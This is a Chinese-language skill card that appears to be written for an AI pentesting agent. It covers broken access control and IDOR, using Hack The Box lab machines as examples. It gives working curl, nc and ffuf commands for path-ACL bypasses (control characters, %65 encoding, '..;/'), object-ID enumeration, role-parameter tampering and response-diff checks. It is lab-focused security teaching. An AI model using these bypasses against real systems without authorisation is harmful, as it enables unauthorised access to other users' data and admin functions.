---
name: 'broken-access-control-idor'
description: '越权与 IDOR 的判定面：路径/前缀检查绕过（编码/大小写/控制字符/`..;/`）、对象 ID 不校验属主、角色字段客户端可控，以及用 302→200 这类响应差异确认越权成功。9 台 Insane 命中。（检索词：IDOR/broken access control/越权/水平越权/垂直越权/access control bypass/ACL bypass/403 bypass/privat%65/..;/响应差异/response diff/broken-access-control/access-control-bypass/ACL-bypass/response-diff）'
whenToUse: '看到 /xxx/<自增整数> 或 ?fileId= 这类对象引用、403 但 body 仍有内容、或请求里带 role/mod/isAdmin 字段时加载。'
metadata: { domain: web, tier: T2 }
---

# 越权与 IDOR：授权只由客户端参数决定的破解法

> 来自 Insane 官方 WP 逐台回核，**9 台命中**：Corporate / Bookworm / Cobblestone / Fingerprint / Skyfall / Smasher2 / PikaTwoo / Rabbit / DarkCorp
> （RegistryTwo、Ouija 提供同族补充案例）

## 触发信号

| 可观察现象 | 含义 |
|---|---|
| `/basket/484/edit`、`?fileId=218`、`/details.php?id=4` | 自增整数对象引用 = IDOR 第一信号 |
| 请求体含 `mod=customer`、`role=sales`、`isAdmin=false` | 授权由客户端参数决定 |
| **403 但响应体里仍有页面内容** | 前端在拦，后端没拦 |
| 改一个参数后 `302 FOUND` 变 `200 OK` | 越权成功的硬证据 |
| 所有含 `dev` / `private` / `metrics` 的路径一律 403 | 前缀黑名单 → 去找归一化差异 |
| 同一路径被两台服务器用不同风格拒绝（Nginx 403 / Flask 403） | 双解析器分歧 |
| 源码注释里有 `<!-- 484 -->` | 他人对象 ID 被直接泄漏 |
| 连续上传两个对象，ID 是 254、255 | 自增存储，无 UUID |

## 前置验证

```bash
# 1. 拿原始响应，不跟随重定向 —— 302 的 body 常常就是被保护页面
curl -i -s http://TARGET/admin | head -40

# 2. 确认 ID 是否自增：连传两个自己的对象比较 ID（Corporate: 254、255）

# 3. 确认 403 是谁发的
curl -sI http://TARGET/metrics | grep -i '^server\|^HTTP'

# 4. 备好第二个账号做对照组 —— 水平越权没有对照组无法确认
```

## 模式 1: 路径/前缀检查绕过

**条件**：ACL 基于**字符串前缀**（`dev*` / `private` / `/admin`），而后端还会做一次归一化或解码。

```bash
# ① 控制字符：Flask 剥 \x85 \xA0 \x1F \x1E \x1D \x1C \x0C \x0B \x09，Nginx 不剥
printf 'GET /metrics\x0c HTTP/1.1\r\nHost: skyfall.htb\r\n\r\n' | nc -q1 10.10.11.254 80

# ② URL 编码单个字符：APISIX uri-blocker 对未归一化的 request_uri 做 re_find
curl -k --path-as-is https://api.pokatmon-app.htb/privat%65/

# ③ Tomcat `..;/`：Nginx 不拒绝 `;`，Tomcat 把 `..;` 当矩阵参数吃掉
curl -sk 'https://www.webhosting.htb/hosting/..;/examples/servlets/'
```

| 机器 | 细节 |
|---|---|
| Skyfall | Nginx 1.18.0 + Flask；`/metrics` 尾部加 `\x0c`/`\x0b`/`\x09` → 200，泄漏 MinIO 版本与 endpoint |
| PikaTwoo | APISIX uri-blocker 无归一化 → `/privat%65/` 通过，扫出 `/private/password-reset` |
| RegistryTwo | `..;/` 绕路径 ACL，进 `examples/servlets/` 伪造 `s_IsLoggedInUserRoleManager` |
| Ouija | HAProxy 用 `dev*` 拦 Host，需走私才能访问 `dev.ouija.htb`（转 `http-request-smuggling`） |

🔴 **curl 必须加 `--path-as-is`**，否则你测的是 curl 自己的归一化，不是目标的。

## 模式 2: 对象 ID 不校验属主（IDOR）

**条件**：对象引用是自增整数，服务端只用 ID 查库、不比对当前用户。

```bash
# Corporate: /sharing 的 fileId 完全不校验属主 —— 把别人的文件"分享给自己"
POST /sharing HTTP/1.1
Host: people.corporate.htb
Cookie: CorporateSSO=<candido 的 JWT>

fileId=200&email=jammie.corkery%40corporate.htb

# 成功判据：响应体回显对方资料 {"id":5069,"name":"Jammie",...}
# Intruder 只在 fileId 上放 payload，跑 1..255 → 122 号 onboarding PDF
seq 255 > ids
# → 泄漏默认口令模板 CorporateStarter<DD><MM><YYYY>
```

| 机器 | 细节 |
|---|---|
| Corporate | `fileId` 不校验属主；枚举 1–255 → file **122** onboarding PDF → `CorporateStarter04041987` |
| Bookworm | `/basket/<id>/edit` IDOR；`bookIds` 多值参数还能叠加穿越 |
| Cobblestone | `/details.php?id=<n>` 为自增整数，可回退遍历他人提交 |
| Smasher2 | `check_login` 只比 username 不比 password → 猜中 `Administrator`（大小写敏感）即登录 |
| DarkCorp | RoundCube 联系人页的 `recipient` 不校验/不过滤属主 → 显式 IDOR（是后续 CVE-2024-42009 XSS 链的前置条件） |

## 模式 3: 角色字段客户端可控（垂直越权）

**条件**：服务端把请求里的角色/权限字段直接当授权依据。

```bash
# Rabbit: 投诉管理系统用请求里的 mod 参数决定角色
# 注册普通 customer → 抓包 → mod=customer 改成 mod=admin
# 改完立刻能查看投诉列表并 Assign Complaint

# Smasher2: 下载源码确认比对逻辑
wget http://smasher2.htb/backup/auth.py
```

| 机器 | 细节 |
|---|---|
| Rabbit | 请求参数 `mod` 由 `customer` 改为 `admin` → 越权查看/分配投诉 |
| Smasher2 | `auth.py` 只校验用户名 → `Administrator` 登录并返回 API key |

## 模式 4: 用响应差异确认越权成功 ← **最实用**

**302/403 只是前端的说法，body 才是后端的答案。**

```bash
# ① 状态码：Fingerprint 的 /admin 返回 302 重定向到 /login，但 body 就是 admin 页面
curl -i -s http://10.10.11.127/admin | head -20
# Burp Proxy > Options > Match and Replace：response header "302 FOUND" → "200 OK"

# ② 长度差异：把"被拦"当基线，找偏离项
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' http://TARGET/private/
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' http://TARGET/privat%65/

# ③ ffuf 过滤掉基线尺寸/行数
ffuf -u http://10.129.220.131 -H 'Host: FUZZ.ouija.htb' -w subs.txt -fs 178 -fl 364
```

| 差异轴 | 观察点 | 实例 |
|---|---|---|
| 状态码 | `302 FOUND` → `200 OK` | Fingerprint `/admin` |
| 响应体 | 403 里带完整页面 / 回显对方资料 | Fingerprint、Corporate |
| 长度行数 | `-fs` / `-fl` 过滤后剩下的异常项 | Ouija Host 爆破 |

## 快速检查清单

```bash
[ ] 每个整数 ID 试过 ±1 和 ±10
[ ] 用第二个账号做过对照组
[ ] role/mod/isAdmin 字段改成过 admin/true/1
[ ] 403 的响应体用 curl -i 看过，不只看状态码
[ ] 用 --path-as-is 试过 %2e%2e%2f、..;/、大小写变体
[ ] 路径尾部塞过 \x0c \x0b \x09 \x85 \xA0
[ ] URL 编码过路径里的单个字符（privat%65）
[ ] 同名参数重复提交（bookIds=13&bookIds=...）
```

## 教训

1. **302/403 只是前端的说法，body 才是后端的答案** —— Fingerprint 一边 302 一边把整页内容发回来。
2. **自增整数 ID 就是 API** —— Corporate 的 200–255 全可枚举，最后在 122 拿到口令模板。看到小整数先怀疑缺 UUID。
3. **水平越权必须有对照组** —— Corporate 靠两个被窃 cookie、Bookworm 靠 test1/test2 才成立。
4. **两套归一化 → 一定有分歧** —— Nginx/Flask、APISIX/PHP、Nginx/Tomcat 三组同一套路；先看 Server 头确认"谁拦的"。
5. **curl 默认不跟随重定向是优势**，但要记得加 `--path-as-is`。

## 相关卡

- `waf-filter-bypass-patterns` —— 绕过对象是 WAF/过滤规则本身（而非 ACL 前缀或属主校验）时转过去
- `http-request-smuggling` —— Ouija/Sink 那类"ACL 由前端代理执行"的场景
- `web-attacks` —— 认证/会话/注入总手册
- `challenge-web-chain` —— 越权只是链条一环（XSS 偷 cookie → IDOR → 凭据）时
- `flask-session-forgery` —— Fingerprint 后半段拿到 `SECRET_KEY` 后伪造 admin cookie
